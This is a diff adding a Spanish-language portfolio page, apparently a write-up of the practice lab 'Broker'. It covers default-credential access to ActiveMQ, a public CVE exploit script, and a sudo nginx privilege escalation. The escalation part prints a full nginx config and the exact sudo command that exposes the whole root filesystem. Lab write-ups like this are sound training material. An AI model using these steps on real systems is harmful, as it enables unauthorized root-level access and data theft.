@@ -1,0 +1,31 @@
+<!doctype html><html lang="es"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="description" content="Portfolio de Daniel Escolar: ciberseguridad junior, SOC, Blue Team y laboratorios documentados."><title>Broker · Daniel Escolar</title><link rel="stylesheet" href="styles.css"></head><body><a class="skip" href="#contenido">Saltar al contenido</a><header class="nav"><div class="wrap"><a class="brand" href="index.html">DE<b>.</b></a><nav aria-label="Navegación principal"><a href="index.html#perfil">Perfil</a><a href="index.html#laboratorios">Laboratorios</a><a href="index.html#contacto">Contacto ↗</a></nav></div></header><main id="contenido" class="article"><a class="muted" href="index.html#laboratorios">← Todos los laboratorios</a><p class="eyebrow">Laboratorio · Linux</p><h1>Broker</h1><p class="lead">Acceso mediante ActiveMQ y abuso de Nginx ejecutado con sudo.</p><p class="tag">ActiveMQ · Nginx</p><div class="intro"><h2 style="margin-top:0">Resultado documentado</h2><p>El cierre documenta lectura del contenido del directorio de root; no afirma una shell de root.</p></div><details open><summary>Apuntes de la resolución</summary><p class="notice">Texto adaptado desde mis apuntes de laboratorio. Las capturas no se incluyen en esta edición; algunos pasos remiten a ellas. El cierre se ha seleccionado por lo descrito en el texto, sin repetir técnicamente la explotación.</p><h2>Broker</h2>
+<p>Al hacer nuestro escaneo por nmap podemos ver muchísimos puertos abiertos. Lo primero que nos llama la atención es el puerto 80 el cual nos pide una contraseña y usuario nada más cargar la página. </p>
+<p>Al intentar entrar con default credentials en ActiveMQ , como <code>admin admin</code> podemos ver que nos deja entrar y ver lo siguiente:</p>
+<p>Si husmeamos un poco podemos ver que es la versión <code>5.15.15</code> la cual si hacemos una búsqueda rápida en google nos damos cuenta que es vulnerable y nos aparece su <code>CVE</code>.</p>
+<p>Buscando su <code>CVE</code> vemos como existe un repositorio de github el cual nos explica como explotar esta vulnerabilidad.</p>
+<p>El formato para correr este script en <code>go</code> es el siguiente: <code>go run {script} {ip objetivo} {puerto} {server http donde alojemos localmente el fichero xml}</code>. </p>
+<p>Antes de lanzar el script vamos a modificar el archivo <code>poc-linux.xml</code> y adecuarlo a nuestra máquina.</p>
+<p>Una vez hecho esto lo lanzamos. Al lanzarla y settearla por el puerto <code>80</code> nos damos cuenta que no nos devuelve la reverse shell por lo que si pensamos un poco y habiendo leído el funcionamiento nos daremos cuenta que este script ataca directamente al puerto , por defecto , <code>61616</code> y este mismo puerto lo tenemos abierto en la máquina objetivo.</p>
+<p>Por lo que si quitamos lo de puerto 80 probablemente nos funcione, y efectivamente funciona:</p>
+<h2>Escalada de privilegios</h2>
+<p>Una vez dentro si hacemos <code>sudo -l</code> podemos ver que podemos ejecutar <code>/usr/sbin/nginx</code> como root. Esto nos lleva a poder levantar un servicio web como si fuéramos root para poder leer todo lo que hay en el directorio root.</p>
+<p>Nos vamos al directorio <code>/tmp</code> para tener permisos de escritura y demás y creamos un archivo <code>.conf</code> para enginx con el siguiente contenido:</p>
+<pre><code>user root;
+worker_processes auto;
+pid /run/nginx2.pid;
+include /etc/nginx/modules-enabled/*.conf;
+events {
+worker_connections 1024;
+}
+http {
+server {
+listen 7777;
+location / {
+root /;
+autoindex on;
+dav_methods PUT;
+}
+}
+}</code></pre>
+<p>Y después simplemente tenemos que añadir nuestra configuración a nginx con el siguiente comando: <code>sudo /usr/sbin/nginx -c /tmp/pwnd.conf</code>.</p>
+<p>Si ahora accedemos a la web por el puerto 7777 podremos ver todo el contenido de root.</p></details><div class="actions"><a class="button" href="index.html#laboratorios">← Volver al catálogo</a></div></main><footer><div class="wrap">Daniel Escolar · Ciberseguridad y desarrollo · Laboratorios realizados en entornos de práctica.</div></footer></body></html>
